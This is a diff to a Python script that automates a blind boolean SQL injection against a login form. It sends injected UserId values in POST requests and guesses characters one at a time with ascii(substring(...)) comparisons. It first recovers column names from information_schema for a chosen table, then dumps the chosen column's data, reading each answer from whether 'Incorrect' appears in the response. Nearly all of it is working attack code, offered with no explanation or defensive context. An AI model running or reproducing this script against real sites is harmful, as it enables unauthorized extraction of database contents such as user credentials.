@@ -109,3 +109,86 @@ if ans3 == '1':
 else:
     print("ok, bye")
     exit()
+
+print("search column.")
+print(tablelist)
+print('frist. select table ')
+tbname= input('chat table name\n')
+sqlicolumn1 = userid+"' and (ascii(substring((select column_name from information_schema.columns where table_name='"+tbname+"' limit 0,1),1,1))>0) and '1'='1"
+sqlipostquery1 = "UserId="+sqlicolumn1+"&Password="+password+"&Submit=Login"
+res  = requests.post(url=URL, data=sqlipostquery1, headers={"Content-Type": "application/x-www-form-urlencoded"})
+columnlist = []
+if "Incorrect" not in res.text:
+    for i in range(0,10):
+        sqlicolumn2 = userid+"' and (ascii(substring((select column_name from information_schema.columns where table_name='"+tbname+"' limit "+str(i)+",1),1,1))>0) and '1'='1"
+        sqlipostquery2 = "UserId="+sqlicolumn2+"&Password="+password+"&Submit=Login"
+        res  = requests.post(url=URL, data=sqlipostquery2, headers={"Content-Type": "application/x-www-form-urlencoded"})
+        columnname = ''
+        if "Incorrect" not in res.text:
+            for j in range(1, 31):
+                sqlicolumn3 = userid+"' and (ascii(substring((select column_name from information_schema.columns where table_name='"+tbname+"' limit "+str(i)+",1),"+str(j)+",1))>0) and '1'='1"
+                sqlipostquery3 = "UserId="+sqlicolumn3+"&Password="+password+"&Submit=Login"
+                res  = requests.post(url=URL, data=sqlipostquery3, headers={"Content-Type": "application/x-www-form-urlencoded"})
+                if "Incorrect" not in res.text:
+                    for k in range(32, 126):
+                        sqlicolumn4 = userid+"' and (ascii(substring((select column_name from information_schema.columns where table_name='"+tbname+"' limit "+str(i)+",1),"+str(j)+",1))="+str(k)+") and '1'='1"
+                        sqlipostquery4 = "UserId="+sqlicolumn4+"&Password="+password+"&Submit=Login"
+                        res  = requests.post(url=URL, data=sqlipostquery4, headers={"Content-Type": "application/x-www-form-urlencoded"})
+                        if "Incorrect" not in res.text:
+                            columnname = columnname + chr(k)
+                            break
+                        else:
+                            pass
+                else:
+                    break
+            print("\n-----\n"+columnname+"\n-----")
+            columnlist.append(columnname)
+        else: 
+            break
+else:
+    print("ok, bye")
+    exit()
+
+print('frist. select table')
+print(tablelist)
+tableans = input("\n")
+print("second. select column")
+print(columnlist)
+columnans = input("\n")
+print('table  : '+tableans+'\ncolumn : '+columnans)
+
+sqlidata1 = userid+"' and (ascii(substring((select "+columnans+" from "+tableans+" limit 0,1),1,1))>0) and '1'='1"
+sqlipostquery1 = "UserId="+sqlidata1+"&Password="+password+"&Submit=Login"
+res  = requests.post(url=URL, data=sqlipostquery1, headers={"Content-Type": "application/x-www-form-urlencoded"})
+datalist = []
+if "Incorrect" not in res.text:
+    for i in range(0, 10):
+        dataname = ''
+        sqlidata2 = userid+"' and (ascii(substring((select "+columnans+" from "+tableans+" limit "+str(i)+",1),1,1))>0) and '1'='1"
+        sqlipostquery2 = "UserId="+sqlidata2+"&Password="+password+"&Submit=Login"
+        res  = requests.post(url=URL, data=sqlipostquery2, headers={"Content-Type": "application/x-www-form-urlencoded"})
+        if "Incorrect" not in res.text:
+            for j in range(1, 31):
+                sqlidata3 = userid+"' and (ascii(substring((select "+columnans+" from "+tableans+" limit "+str(i)+",1),"+str(j)+",1))>0) and '1'='1"
+                sqlipostquery3 = "UserId="+sqlidata3+"&Password="+password+"&Submit=Login"
+                res  = requests.post(url=URL, data=sqlipostquery3, headers={"Content-Type": "application/x-www-form-urlencoded"})
+                if "Incorrect" not in res.text:
+                    for k in range(32, 126):
+                        sqlidata4 = userid+"' and (ascii(substring((select "+columnans+" from "+tableans+" limit "+str(i)+",1),"+str(j)+",1))="+str(k)+") and '1'='1"
+                        sqlipostquery4 = "UserId="+sqlidata4+"&Password="+password+"&Submit=Login"
+                        res  = requests.post(url=URL, data=sqlipostquery4, headers={"Content-Type": "application/x-www-form-urlencoded"})
+                        if "Incorrect" not in res.text:
+                            dataname = dataname + chr(k)
+                            break
+                        else:
+                            pass
+                else:
+                    break
+            print(dataname)
+            datalist.append(dataname)
+        else:
+            break
+    print(datalist)
+else:
+    print("ok, bye")
+    exit()
